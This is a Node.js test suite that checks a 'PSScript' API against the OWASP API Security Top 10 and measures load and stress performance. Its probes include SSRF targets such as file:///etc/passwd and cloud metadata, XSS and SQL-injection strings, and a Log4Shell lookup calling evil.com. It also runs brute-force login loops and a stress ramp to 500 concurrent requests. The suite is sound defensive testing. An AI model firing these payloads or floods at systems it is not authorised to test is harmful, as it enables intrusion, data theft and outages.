#!/usr/bin/env node

/**
 * PSScript Comprehensive API Security & Performance Testing Suite
 * Tests for OWASP API Security Top 10 vulnerabilities
 */

const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');
const { performance } = require('perf_hooks');

// Configuration
const API_BASE_URL = process.env.API_URL || 'http://localhost:4001/api';
const TEST_USER = {
  email: 'test@example.com',
  password: 'Test123!@#',
  username: 'testuser'
};
const ADMIN_USER = {
  email: 'admin@example.com',
  password: 'Admin123!@#',
  username: 'adminuser'
};

// Test results collector
const testResults = {
  timestamp: new Date().toISOString(),
  apiVersion: 'PSScript 1.0',
  baseUrl: API_BASE_URL,
  summary: {
    total: 0,
    passed: 0,
    failed: 0,
    vulnerabilities: []
  },
  tests: [],
  performanceMetrics: {
    endpoints: {},
    loadTest: {},
    stressTest: {}
  }
};

// Helper functions
class APITester {
  constructor() {
    this.tokens = {};
    this.sessionCookies = {};
  }

  async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async measurePerformance(fn, label) {
    const start = performance.now();
    try {
      const result = await fn();
      const duration = performance.now() - start;
      return { success: true, duration, result };
    } catch (error) {
      const duration = performance.now() - start;
      return { success: false, duration, error: error.message };
    }
  }

  async makeRequest(config) {
    try {
      const response = await axios({
        ...config,
        validateStatus: () => true,
        timeout: 30000
      });
      return response;
    } catch (error) {
      if (error.response) {
        return error.response;
      }
      throw error;
    }
  }

  recordTest(category, name, passed, details = {}) {
    const test = {
      category,
      name,
      passed,
      timestamp: new Date().toISOString(),
      ...details
    };
    
    testResults.tests.push(test);
    testResults.summary.total++;
    
    if (passed) {
      testResults.summary.passed++;
    } else {
      testResults.summary.failed++;
      if (details.vulnerability) {
        testResults.summary.vulnerabilities.push({
          category,
          name,
          severity: details.severity || 'medium',
          description: details.description
        });
      }
    }
    
    console.log(`${passed ? '✓' : '✗'} ${category}: ${name}`);
    if (!passed && details.description) {
      console.log(`  └─ ${details.description}`);
    }
  }

  // Authentication helper
  async authenticate(user) {
    try {
      const response = await this.makeRequest({
        method: 'POST',
        url: `${API_BASE_URL}/auth/login`,
        data: user
      });

      if (response.status === 200 && response.data.token) {
        this.tokens[user.email] = response.data.token;
        this.sessionCookies[user.email] = response.headers['set-cookie'];
        return response.data.token;
      }
      return null;
    } catch (error) {
      console.error('Authentication failed:', error.message);
      return null;
    }
  }
}

// OWASP API Security Top 10 Tests
class SecurityTests extends APITester {
  // API1:2023 - Broken Object Level Authorization
  async testBrokenObjectLevelAuth() {
    console.log('\n=== API1: Broken Object Level Authorization ===');
    
    // Get user token
    const userToken = await this.authenticate(TEST_USER);
    
    // Try to access another user's data
    const response = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/users/2`, // Assuming user ID 1 is the test user
      headers: { Authorization: `Bearer ${userToken}` }
    });

    this.recordTest(
      'API1:2023',
      'Unauthorized user data access',
      response.status === 403 || response.status === 404,
      {
        vulnerability: response.status === 200,
        severity: 'high',
        description: response.status === 200 ? 
          'User can access other users\' data without authorization' : 
          'Properly restricted access to user data',
        endpoint: '/api/users/:id',
        status: response.status
      }
    );

    // Test script access
    const scriptResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/scripts/999999`, // Non-existent or other user's script
      headers: { Authorization: `Bearer ${userToken}` }
    });

    this.recordTest(
      'API1:2023',
      'Unauthorized script access',
      scriptResponse.status === 403 || scriptResponse.status === 404,
      {
        vulnerability: scriptResponse.status === 200 && scriptResponse.data.userId !== 1,
        severity: 'high',
        description: scriptResponse.status === 200 ? 
          'User can access scripts belonging to other users' : 
          'Script access properly restricted',
        endpoint: '/api/scripts/:id',
        status: scriptResponse.status
      }
    );
  }

  // API2:2023 - Broken Authentication
  async testBrokenAuthentication() {
    console.log('\n=== API2: Broken Authentication ===');

    // Test weak password policy
    const weakPasswordResponse = await this.makeRequest({
      method: 'POST',
      url: `${API_BASE_URL}/auth/register`,
      data: {
        email: 'weak@example.com',
        password: '123',
        username: 'weakuser'
      }
    });

    this.recordTest(
      'API2:2023',
      'Weak password policy',
      weakPasswordResponse.status === 400,
      {
        vulnerability: weakPasswordResponse.status === 201,
        severity: 'high',
        description: weakPasswordResponse.status === 201 ? 
          'System accepts weak passwords' : 
          'Strong password policy enforced',
        endpoint: '/api/auth/register'
      }
    );

    // Test brute force protection
    const bruteForceAttempts = 20;
    let blockedAt = -1;
    
    for (let i = 0; i < bruteForceAttempts; i++) {
      const response = await this.makeRequest({
        method: 'POST',
        url: `${API_BASE_URL}/auth/login`,
        data: {
          email: 'test@example.com',
          password: 'wrongpassword'
        }
      });
      
      if (response.status === 429) {
        blockedAt = i + 1;
        break;
      }
    }

    this.recordTest(
      'API2:2023',
      'Brute force protection',
      blockedAt > 0 && blockedAt <= 10,
      {
        vulnerability: blockedAt === -1,
        severity: 'high',
        description: blockedAt === -1 ? 
          `No rate limiting on login - ${bruteForceAttempts} attempts allowed` : 
          `Rate limiting active - blocked after ${blockedAt} attempts`,
        endpoint: '/api/auth/login'
      }
    );

    // Test JWT token expiration
    const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZXhwIjoxNjAwMDAwMDAwfQ.invalid';
    const expiredTokenResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/auth/me`,
      headers: { Authorization: `Bearer ${expiredToken}` }
    });

    this.recordTest(
      'API2:2023',
      'Expired token validation',
      expiredTokenResponse.status === 401,
      {
        vulnerability: expiredTokenResponse.status === 200,
        severity: 'critical',
        description: expiredTokenResponse.status === 200 ? 
          'System accepts expired or invalid tokens' : 
          'Properly validates token expiration',
        endpoint: '/api/auth/me'
      }
    );
  }

  // API3:2023 - Broken Object Property Level Authorization
  async testBrokenPropertyLevelAuth() {
    console.log('\n=== API3: Broken Object Property Level Authorization ===');

    const userToken = await this.authenticate(TEST_USER);

    // Try to update sensitive fields
    const updateResponse = await this.makeRequest({
      method: 'PUT',
      url: `${API_BASE_URL}/users/1`,
      headers: { Authorization: `Bearer ${userToken}` },
      data: {
        email: 'test@example.com',
        role: 'admin', // Should not be allowed
        isActive: true,
        verified: true // Should not be allowed
      }
    });

    this.recordTest(
      'API3:2023',
      'Mass assignment protection',
      updateResponse.status === 403 || (updateResponse.status === 200 && !updateResponse.data?.role),
      {
        vulnerability: updateResponse.status === 200 && updateResponse.data?.role === 'admin',
        severity: 'critical',
        description: updateResponse.status === 200 && updateResponse.data?.role === 'admin' ? 
          'User can escalate privileges through mass assignment' : 
          'Sensitive fields protected from mass assignment',
        endpoint: '/api/users/:id'
      }
    );
  }

  // API4:2023 - Unrestricted Resource Consumption
  async testUnrestrictedResourceConsumption() {
    console.log('\n=== API4: Unrestricted Resource Consumption ===');

    // Test pagination limits
    const largePageResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/scripts?limit=10000&page=1`
    });

    const actualLimit = largePageResponse.data?.data?.length || 0;
    this.recordTest(
      'API4:2023',
      'Pagination limit enforcement',
      actualLimit <= 100,
      {
        vulnerability: actualLimit > 100,
        severity: 'medium',
        description: actualLimit > 100 ? 
          `API returns ${actualLimit} items - no reasonable limit enforced` : 
          `API limits response to ${actualLimit} items`,
        endpoint: '/api/scripts'
      }
    );

    // Test large payload handling
    const largeScript = {
      name: 'Large Script',
      description: 'Test',
      content: 'A'.repeat(10 * 1024 * 1024), // 10MB
      categoryId: 1
    };

    const largePayloadResponse = await this.makeRequest({
      method: 'POST',
      url: `${API_BASE_URL}/scripts`,
      headers: { 
        Authorization: `Bearer ${await this.authenticate(TEST_USER)}`,
        'Content-Type': 'application/json'
      },
      data: largeScript,
      maxContentLength: 50 * 1024 * 1024
    });

    this.recordTest(
      'API4:2023',
      'Large payload protection',
      largePayloadResponse.status === 413 || largePayloadResponse.status === 400,
      {
        vulnerability: largePayloadResponse.status === 201,
        severity: 'medium',
        description: largePayloadResponse.status === 201 ? 
          'API accepts extremely large payloads without restriction' : 
          'API properly limits payload size',
        endpoint: '/api/scripts'
      }
    );
  }

  // API5:2023 - Broken Function Level Authorization
  async testBrokenFunctionLevelAuth() {
    console.log('\n=== API5: Broken Function Level Authorization ===');

    const userToken = await this.authenticate(TEST_USER);

    // Try to access admin endpoints
    const adminEndpoints = [
      { method: 'GET', url: '/api/analytics/system' },
      { method: 'POST', url: '/api/categories' },
      { method: 'DELETE', url: '/api/users/2' },
      { method: 'GET', url: '/api/cache/stats' }
    ];

    for (const endpoint of adminEndpoints) {
      const response = await this.makeRequest({
        ...endpoint,
        url: `${API_BASE_URL}${endpoint.url.replace('/api', '')}`,
        headers: { Authorization: `Bearer ${userToken}` }
      });

      this.recordTest(
        'API5:2023',
        `Admin function access: ${endpoint.method} ${endpoint.url}`,
        response.status === 403 || response.status === 401,
        {
          vulnerability: response.status === 200 || response.status === 201,
          severity: 'high',
          description: response.status < 400 ? 
            'Regular user can access admin functions' : 
            'Admin functions properly restricted',
          endpoint: endpoint.url,
          method: endpoint.method,
          status: response.status
        }
      );
    }
  }

  // API6:2023 - Unrestricted Access to Sensitive Business Flows
  async testSensitiveBusinessFlows() {
    console.log('\n=== API6: Unrestricted Access to Sensitive Business Flows ===');

    // Test automated script creation rate limiting
    const scriptCreationAttempts = 10;
    let scriptsCreated = 0;
    const userToken = await this.authenticate(TEST_USER);

    for (let i = 0; i < scriptCreationAttempts; i++) {
      const response = await this.makeRequest({
        method: 'POST',
        url: `${API_BASE_URL}/scripts`,
        headers: { Authorization: `Bearer ${userToken}` },
        data: {
          name: `Test Script ${Date.now()}_${i}`,
          description: 'Automated test',
          content: 'Write-Host "Test"',
          categoryId: 1
        }
      });

      if (response.status === 201) {
        scriptsCreated++;
      } else if (response.status === 429) {
        break;
      }
    }

    this.recordTest(
      'API6:2023',
      'Business flow rate limiting',
      scriptsCreated < 10,
      {
        vulnerability: scriptsCreated >= 10,
        severity: 'medium',
        description: scriptsCreated >= 10 ? 
          `Allowed ${scriptsCreated} rapid script creations - no rate limiting` : 
          `Rate limiting active - ${scriptsCreated} scripts created before limit`,
        endpoint: '/api/scripts'
      }
    );
  }

  // API7:2023 - Server Side Request Forgery (SSRF)
  async testSSRF() {
    console.log('\n=== API7: Server Side Request Forgery (SSRF) ===');

    const ssrfPayloads = [
      'http://localhost:4001/api/health',
      'http://127.0.0.1:22',
      'file:///etc/passwd',
      'http://169.254.169.254/latest/meta-data/'
    ];

    for (const payload of ssrfPayloads) {
      // Test if any endpoint accepts URLs
      const response = await this.makeRequest({
        method: 'POST',
        url: `${API_BASE_URL}/scripts`,
        headers: { Authorization: `Bearer ${await this.authenticate(TEST_USER)}` },
        data: {
          name: 'SSRF Test',
          description: 'Testing SSRF',
          content: `Invoke-WebRequest -Uri "${payload}"`,
          categoryId: 1,
          metadata: { webhookUrl: payload }
        }
      });

      this.recordTest(
        'API7:2023',
        `SSRF protection: ${payload}`,
        !response.data?.content?.includes(payload) || response.status >= 400,
        {
          vulnerability: response.status === 201 && response.data?.metadata?.webhookUrl === payload,
          severity: 'critical',
          description: response.status === 201 ? 
            'API may be vulnerable to SSRF attacks' : 
            'API properly validates and sanitizes URLs',
          endpoint: '/api/scripts',
          payload
        }
      );
    }
  }

  // API8:2023 - Security Misconfiguration
  async testSecurityMisconfiguration() {
    console.log('\n=== API8: Security Misconfiguration ===');

    // Check for security headers
    const response = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/health`
    });

    const securityHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': 'max-age=31536000',
      'content-security-policy': true
    };

    for (const [header, expectedValue] of Object.entries(securityHeaders)) {
      const headerValue = response.headers[header];
      const hasHeader = headerValue !== undefined;
      
      this.recordTest(
        'API8:2023',
        `Security header: ${header}`,
        hasHeader,
        {
          vulnerability: !hasHeader,
          severity: 'medium',
          description: !hasHeader ? 
            `Missing security header: ${header}` : 
            `Security header present: ${header} = ${headerValue}`,
          endpoint: '/api/health'
        }
      );
    }

    // Check for CORS configuration
    const corsResponse = await this.makeRequest({
      method: 'OPTIONS',
      url: `${API_BASE_URL}/scripts`,
      headers: {
        'Origin': 'http://evil.com',
        'Access-Control-Request-Method': 'POST'
      }
    });

    const allowsAllOrigins = corsResponse.headers['access-control-allow-origin'] === '*' ||
                           corsResponse.headers['access-control-allow-origin'] === 'http://evil.com';

    this.recordTest(
      'API8:2023',
      'CORS configuration',
      !allowsAllOrigins,
      {
        vulnerability: allowsAllOrigins,
        severity: 'high',
        description: allowsAllOrigins ? 
          'API allows requests from any origin' : 
          'CORS properly configured',
        endpoint: '/api/scripts'
      }
    );

    // Check for error information disclosure
    const errorResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/scripts/invalid-id`
    });

    const exposesStackTrace = errorResponse.data?.stack || 
                            errorResponse.data?.error?.stack ||
                            JSON.stringify(errorResponse.data).includes('at ');

    this.recordTest(
      'API8:2023',
      'Error information disclosure',
      !exposesStackTrace,
      {
        vulnerability: exposesStackTrace,
        severity: 'medium',
        description: exposesStackTrace ? 
          'API exposes stack traces in error responses' : 
          'Error responses properly sanitized',
        endpoint: '/api/scripts/:id'
      }
    );
  }

  // API9:2023 - Improper Inventory Management
  async testImproperInventoryManagement() {
    console.log('\n=== API9: Improper Inventory Management ===');

    // Check for API documentation
    const docsResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL.replace('/api', '')}/api-docs`
    });

    this.recordTest(
      'API9:2023',
      'API documentation availability',
      docsResponse.status === 200,
      {
        vulnerability: docsResponse.status !== 200,
        severity: 'low',
        description: docsResponse.status !== 200 ? 
          'API documentation not available' : 
          'API documentation properly maintained',
        endpoint: '/api-docs'
      }
    );

    // Check for deprecated endpoints
    const deprecatedEndpoints = [
      '/api/v1/scripts',
      '/api/legacy/auth',
      '/api/old/users'
    ];

    for (const endpoint of deprecatedEndpoints) {
      const response = await this.makeRequest({
        method: 'GET',
        url: `${API_BASE_URL.replace('/api', '')}${endpoint}`
      });

      this.recordTest(
        'API9:2023',
        `Deprecated endpoint: ${endpoint}`,
        response.status === 404,
        {
          vulnerability: response.status !== 404,
          severity: 'medium',
          description: response.status !== 404 ? 
            'Deprecated endpoint still accessible' : 
            'Deprecated endpoint properly removed',
          endpoint
        }
      );
    }
  }

  // API10:2023 - Unsafe Consumption of APIs
  async testUnsafeAPIConsumption() {
    console.log('\n=== API10: Unsafe Consumption of APIs ===');

    // Test input validation on AI endpoints
    const maliciousInputs = [
      { input: '<script>alert("XSS")</script>', type: 'XSS' },
      { input: '"; DROP TABLE scripts; --', type: 'SQL Injection' },
      { input: '../../../etc/passwd', type: 'Path Traversal' },
      { input: '${jndi:ldap://evil.com/a}', type: 'Log4Shell' }
    ];

    for (const { input, type } of maliciousInputs) {
      const response = await this.makeRequest({
        method: 'POST',
        url: `${API_BASE_URL}/ai-agent/please`,
        headers: { Authorization: `Bearer ${await this.authenticate(TEST_USER)}` },
        data: {
          question: input,
          context: { scriptId: 1 }
        }
      });

      const responseContainsInput = JSON.stringify(response.data).includes(input);
      
      this.recordTest(
        'API10:2023',
        `Input validation: ${type}`,
        !responseContainsInput && response.status !== 500,
        {
          vulnerability: responseContainsInput || response.status === 500,
          severity: 'high',
          description: responseContainsInput ? 
            `API reflects malicious input without sanitization` : 
            `API properly sanitizes ${type} attempts`,
          endpoint: '/api/ai-agent/please',
          payload: input
        }
      );
    }
  }
}

// Performance Testing
class PerformanceTests extends APITester {
  async testEndpointPerformance() {
    console.log('\n=== Performance Testing ===');

    const endpoints = [
      { method: 'GET', url: '/health', name: 'Health Check' },
      { method: 'GET', url: '/scripts?limit=10', name: 'List Scripts' },
      { method: 'GET', url: '/categories', name: 'List Categories' },
      { method: 'GET', url: '/scripts/1', name: 'Get Script' }
    ];

    for (const endpoint of endpoints) {
      const measurements = [];
      
      // Warm up
      await this.makeRequest({
        method: endpoint.method,
        url: `${API_BASE_URL}${endpoint.url}`
      });

      // Take measurements
      for (let i = 0; i < 10; i++) {
        const result = await this.measurePerformance(async () => {
          return await this.makeRequest({
            method: endpoint.method,
            url: `${API_BASE_URL}${endpoint.url}`
          });
        }, endpoint.name);
        
        measurements.push(result.duration);
      }

      const avgTime = measurements.reduce((a, b) => a + b, 0) / measurements.length;
      const p95Time = measurements.sort((a, b) => a - b)[Math.floor(measurements.length * 0.95)];
      const p99Time = measurements.sort((a, b) => a - b)[Math.floor(measurements.length * 0.99)];

      testResults.performanceMetrics.endpoints[endpoint.name] = {
        average: avgTime,
        p95: p95Time,
        p99: p99Time,
        samples: measurements.length
      };

      this.recordTest(
        'Performance',
        `${endpoint.name} response time`,
        p95Time < 500,
        {
          description: `Avg: ${avgTime.toFixed(2)}ms, P95: ${p95Time.toFixed(2)}ms, P99: ${p99Time.toFixed(2)}ms`,
          endpoint: endpoint.url,
          method: endpoint.method
        }
      );
    }
  }

  async loadTest() {
    console.log('\n=== Load Testing ===');

    const concurrentUsers = [1, 10, 50, 100];
    const requestsPerUser = 10;

    for (const users of concurrentUsers) {
      console.log(`\nTesting with ${users} concurrent users...`);
      
      const startTime = performance.now();
      const results = [];

      const userPromises = [];
      for (let u = 0; u < users; u++) {
        userPromises.push((async () => {
          const userResults = [];
          for (let r = 0; r < requestsPerUser; r++) {
            const reqStart = performance.now();
            try {
              const response = await this.makeRequest({
                method: 'GET',
                url: `${API_BASE_URL}/scripts?limit=10&page=${r + 1}`
              });
              userResults.push({
                success: response.status === 200,
                duration: performance.now() - reqStart,
                status: response.status
              });
            } catch (error) {
              userResults.push({
                success: false,
                duration: performance.now() - reqStart,
                error: error.message
              });
            }
          }
          return userResults;
        })());
      }

      const allResults = await Promise.all(userPromises);
      const flatResults = allResults.flat();
      
      const totalDuration = performance.now() - startTime;
      const successfulRequests = flatResults.filter(r => r.success).length;
      const failedRequests = flatResults.filter(r => !r.success).length;
      const avgResponseTime = flatResults.reduce((sum, r) => sum + r.duration, 0) / flatResults.length;
      const throughput = (flatResults.length / totalDuration) * 1000; // requests per second

      testResults.performanceMetrics.loadTest[`${users}_users`] = {
        totalRequests: flatResults.length,
        successful: successfulRequests,
        failed: failedRequests,
        avgResponseTime,
        throughput,
        totalDuration
      };

      this.recordTest(
        'Load Test',
        `${users} concurrent users`,
        failedRequests < flatResults.length * 0.05, // Less than 5% failure rate
        {
          description: `Success: ${successfulRequests}/${flatResults.length}, Avg: ${avgResponseTime.toFixed(2)}ms, Throughput: ${throughput.toFixed(2)} req/s`,
          vulnerability: failedRequests > flatResults.length * 0.1,
          severity: failedRequests > flatResults.length * 0.1 ? 'high' : 'low'
        }
      );
    }
  }

  async stressTest() {
    console.log('\n=== Stress Testing ===');

    let currentLoad = 10;
    let breakingPoint = 0;
    let lastSuccessRate = 1;

    while (currentLoad <= 500 && lastSuccessRate > 0.5) {
      console.log(`\nStress testing with ${currentLoad} concurrent requests...`);
      
      const promises = [];
      const startTime = performance.now();

      for (let i = 0; i < currentLoad; i++) {
        promises.push(this.makeRequest({
          method: 'GET',
          url: `${API_BASE_URL}/health`,
          timeout: 5000
        }).then(res => ({ success: res.status === 200 }))
          .catch(() => ({ success: false })));
      }

      const results = await Promise.all(promises);
      const duration = performance.now() - startTime;
      const successCount = results.filter(r => r.success).length;
      lastSuccessRate = successCount / results.length;

      if (lastSuccessRate < 0.95 && breakingPoint === 0) {
        breakingPoint = currentLoad;
      }

      testResults.performanceMetrics.stressTest[`load_${currentLoad}`] = {
        totalRequests: currentLoad,
        successful: successCount,
        successRate: lastSuccessRate,
        duration,
        throughput: (currentLoad / duration) * 1000
      };

      if (lastSuccessRate < 0.5) break;
      
      currentLoad += currentLoad < 100 ? 10 : 50;
    }

    this.recordTest(
      'Stress Test',
      'Breaking point identification',
      breakingPoint > 50,
      {
        description: `System breaks at ${breakingPoint} concurrent requests`,
        vulnerability: breakingPoint <= 50,
        severity: breakingPoint <= 50 ? 'high' : 'low'
      }
    );
  }
}

// Session Management Tests
class SessionTests extends APITester {
  async testSessionSecurity() {
    console.log('\n=== Session Management Security ===');

    // Test concurrent sessions
    const token1 = await this.authenticate(TEST_USER);
    const token2 = await this.authenticate(TEST_USER);

    const response1 = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/auth/me`,
      headers: { Authorization: `Bearer ${token1}` }
    });

    const response2 = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/auth/me`,
      headers: { Authorization: `Bearer ${token2}` }
    });

    this.recordTest(
      'Session Management',
      'Concurrent session handling',
      response1.status === 200 && response2.status === 200,
      {
        description: 'System properly handles multiple concurrent sessions',
        endpoint: '/api/auth/me'
      }
    );

    // Test session fixation
    const preAuthCookie = 'session=malicious-session-id';
    const loginResponse = await this.makeRequest({
      method: 'POST',
      url: `${API_BASE_URL}/auth/login`,
      data: TEST_USER,
      headers: { Cookie: preAuthCookie }
    });

    const postAuthCookie = loginResponse.headers['set-cookie']?.[0];
    const sessionChanged = !postAuthCookie?.includes('malicious-session-id');

    this.recordTest(
      'Session Management',
      'Session fixation prevention',
      sessionChanged,
      {
        vulnerability: !sessionChanged,
        severity: 'high',
        description: sessionChanged ? 
          'Session ID properly regenerated after login' : 
          'Session ID not regenerated - vulnerable to fixation',
        endpoint: '/api/auth/login'
      }
    );

    // Test logout functionality
    const logoutResponse = await this.makeRequest({
      method: 'POST',
      url: `${API_BASE_URL}/auth/logout`,
      headers: { Authorization: `Bearer ${token1}` }
    });

    const postLogoutResponse = await this.makeRequest({
      method: 'GET',
      url: `${API_BASE_URL}/auth/me`,
      headers: { Authorization: `Bearer ${token1}` }
    });

    this.recordTest(
      'Session Management',
      'Logout effectiveness',
      postLogoutResponse.status === 401,
      {
        vulnerability: postLogoutResponse.status === 200,
        severity: 'high',
        description: postLogoutResponse.status === 401 ? 
          'Token properly invalidated after logout' : 
          'Token still valid after logout',
        endpoint: '/api/auth/logout'
      }
    );
  }
}

// Main test runner
async function runAllTests() {
  console.log('======================================');
  console.log('PSScript API Security & Performance Test Suite');
  console.log('======================================');
  console.log(`Testing API at: ${API_BASE_URL}`);
  console.log(`Start time: ${new Date().toISOString()}`);

  try {
    // Check if API is accessible
    const healthCheck = await axios.get(`${API_BASE_URL}/health`, { 
      validateStatus: () => true,
      timeout: 5000 
    }).catch(() => null);

    if (!healthCheck || healthCheck.status !== 200) {
      console.error('\nError: API is not accessible at', API_BASE_URL);
      console.error('Please ensure the backend is running and accessible.');
      process.exit(1);
    }

    // Create test users if needed
    await axios.post(`${API_BASE_URL}/auth/register`, TEST_USER, { validateStatus: () => true });
    await axios.post(`${API_BASE_URL}/auth/register`, ADMIN_USER, { validateStatus: () => true });

    // Run security tests
    const securityTests = new SecurityTests();
    await securityTests.testBrokenObjectLevelAuth();
    await securityTests.testBrokenAuthentication();
    await securityTests.testBrokenPropertyLevelAuth();
    await securityTests.testUnrestrictedResourceConsumption();
    await securityTests.testBrokenFunctionLevelAuth();
    await securityTests.testSensitiveBusinessFlows();
    await securityTests.testSSRF();
    await securityTests.testSecurityMisconfiguration();
    await securityTests.testImproperInventoryManagement();
    await securityTests.testUnsafeAPIConsumption();

    // Run session tests
    const sessionTests = new SessionTests();
    await sessionTests.testSessionSecurity();

    // Run performance tests
    const performanceTests = new PerformanceTests();
    await performanceTests.testEndpointPerformance();
    await performanceTests.loadTest();
    await performanceTests.stressTest();

  } catch (error) {
    console.error('\nFatal error during testing:', error.message);
    testResults.summary.error = error.message;
  }

  // Generate report
  await generateReport();
}

async function generateReport() {
  console.log('\n======================================');
  console.log('Test Summary');
  console.log('======================================');
  console.log(`Total Tests: ${testResults.summary.total}`);
  console.log(`Passed: ${testResults.summary.passed}`);
  console.log(`Failed: ${testResults.summary.failed}`);
  console.log(`Success Rate: ${((testResults.summary.passed / testResults.summary.total) * 100).toFixed(2)}%`);

  if (testResults.summary.vulnerabilities.length > 0) {
    console.log('\n=== Critical Vulnerabilities Found ===');
    const criticalVulns = testResults.summary.vulnerabilities.filter(v => v.severity === 'critical');
    const highVulns = testResults.summary.vulnerabilities.filter(v => v.severity === 'high');
    const mediumVulns = testResults.summary.vulnerabilities.filter(v => v.severity === 'medium');

    if (criticalVulns.length > 0) {
      console.log('\nCRITICAL:');
      criticalVulns.forEach(v => {
        console.log(`  - ${v.category}: ${v.name}`);
        console.log(`    ${v.description}`);
      });
    }

    if (highVulns.length > 0) {
      console.log('\nHIGH:');
      highVulns.forEach(v => {
        console.log(`  - ${v.category}: ${v.name}`);
        console.log(`    ${v.description}`);
      });
    }

    if (mediumVulns.length > 0) {
      console.log('\nMEDIUM:');
      mediumVulns.forEach(v => {
        console.log(`  - ${v.category}: ${v.name}`);
        console.log(`    ${v.description}`);
      });
    }
  }

  console.log('\n=== Performance Metrics ===');
  console.log('\nEndpoint Performance:');
  Object.entries(testResults.performanceMetrics.endpoints).forEach(([name, metrics]) => {
    console.log(`  ${name}:`);
    console.log(`    Average: ${metrics.average.toFixed(2)}ms`);
    console.log(`    P95: ${metrics.p95.toFixed(2)}ms`);
    console.log(`    P99: ${metrics.p99.toFixed(2)}ms`);
  });

  console.log('\nLoad Test Results:');
  Object.entries(testResults.performanceMetrics.loadTest).forEach(([scenario, metrics]) => {
    console.log(`  ${scenario}:`);
    console.log(`    Success Rate: ${((metrics.successful / metrics.totalRequests) * 100).toFixed(2)}%`);
    console.log(`    Avg Response: ${metrics.avgResponseTime.toFixed(2)}ms`);
    console.log(`    Throughput: ${metrics.throughput.toFixed(2)} req/s`);
  });

  // Save detailed report
  const reportPath = path.join(process.cwd(), `api-test-report-${Date.now()}.json`);
  await fs.writeFile(reportPath, JSON.stringify(testResults, null, 2));
  console.log(`\nDetailed report saved to: ${reportPath}`);

  // Generate markdown report
  const markdownReport = generateMarkdownReport();
  const mdPath = path.join(process.cwd(), `api-test-report-${Date.now()}.md`);
  await fs.writeFile(mdPath, markdownReport);
  console.log(`Markdown report saved to: ${mdPath}`);
}

function generateMarkdownReport() {
  let md = `# PSScript API Security & Performance Test Report

**Test Date**: ${testResults.timestamp}
**API Version**: ${testResults.apiVersion}
**Base URL**: ${testResults.baseUrl}

## Executive Summary

- **Total Tests**: ${testResults.summary.total}
- **Passed**: ${testResults.summary.passed}
- **Failed**: ${testResults.summary.failed}
- **Success Rate**: ${((testResults.summary.passed / testResults.summary.total) * 100).toFixed(2)}%
- **Critical Vulnerabilities**: ${testResults.summary.vulnerabilities.filter(v => v.severity === 'critical').length}
- **High Vulnerabilities**: ${testResults.summary.vulnerabilities.filter(v => v.severity === 'high').length}

## OWASP API Security Top 10 Results

`;

  // Group tests by category
  const testsByCategory = {};
  testResults.tests.forEach(test => {
    if (!testsByCategory[test.category]) {
      testsByCategory[test.category] = [];
    }
    testsByCategory[test.category].push(test);
  });

  Object.entries(testsByCategory).forEach(([category, tests]) => {
    md += `### ${category}\n\n`;
    tests.forEach(test => {
      const status = test.passed ? '✅' : '❌';
      md += `- ${status} **${test.name}**\n`;
      if (test.description) {
        md += `  - ${test.description}\n`;
      }
      if (test.endpoint) {
        md += `  - Endpoint: \`${test.method || 'GET'} ${test.endpoint}\`\n`;
      }
      if (test.vulnerability && !test.passed) {
        md += `  - **Severity**: ${test.severity || 'medium'}\n`;
      }
      md += '\n';
    });
  });

  md += `## Performance Metrics

### Endpoint Response Times

| Endpoint | Average | P95 | P99 |
|----------|---------|-----|-----|
`;

  Object.entries(testResults.performanceMetrics.endpoints).forEach(([name, metrics]) => {
    md += `| ${name} | ${metrics.average.toFixed(2)}ms | ${metrics.p95.toFixed(2)}ms | ${metrics.p99.toFixed(2)}ms |\n`;
  });

  md += `
### Load Test Results

| Concurrent Users | Success Rate | Avg Response | Throughput |
|-----------------|--------------|--------------|------------|
`;

  Object.entries(testResults.performanceMetrics.loadTest).forEach(([scenario, metrics]) => {
    const successRate = ((metrics.successful / metrics.totalRequests) * 100).toFixed(2);
    md += `| ${scenario.replace('_', ' ')} | ${successRate}% | ${metrics.avgResponseTime.toFixed(2)}ms | ${metrics.throughput.toFixed(2)} req/s |\n`;
  });

  md += `
## Recommendations

Based on the test results, here are the key recommendations:

`;

  // Add recommendations based on vulnerabilities
  const criticalVulns = testResults.summary.vulnerabilities.filter(v => v.severity === 'critical');
  const highVulns = testResults.summary.vulnerabilities.filter(v => v.severity === 'high');

  if (criticalVulns.length > 0) {
    md += `### Critical Priority

`;
    criticalVulns.forEach((vuln, i) => {
      md += `${i + 1}. **${vuln.category}**: ${vuln.description}\n`;
    });
  }

  if (highVulns.length > 0) {
    md += `
### High Priority

`;
    highVulns.forEach((vuln, i) => {
      md += `${i + 1}. **${vuln.category}**: ${vuln.description}\n`;
    });
  }

  // Add performance recommendations
  const slowEndpoints = Object.entries(testResults.performanceMetrics.endpoints)
    .filter(([_, metrics]) => metrics.p95 > 500);

  if (slowEndpoints.length > 0) {
    md += `
### Performance Optimization

The following endpoints exceed the 500ms P95 response time target:
`;
    slowEndpoints.forEach(([name, metrics]) => {
      md += `- **${name}**: ${metrics.p95.toFixed(2)}ms (P95)\n`;
    });
  }

  return md;
}

// Run tests
runAllTests().catch(console.error);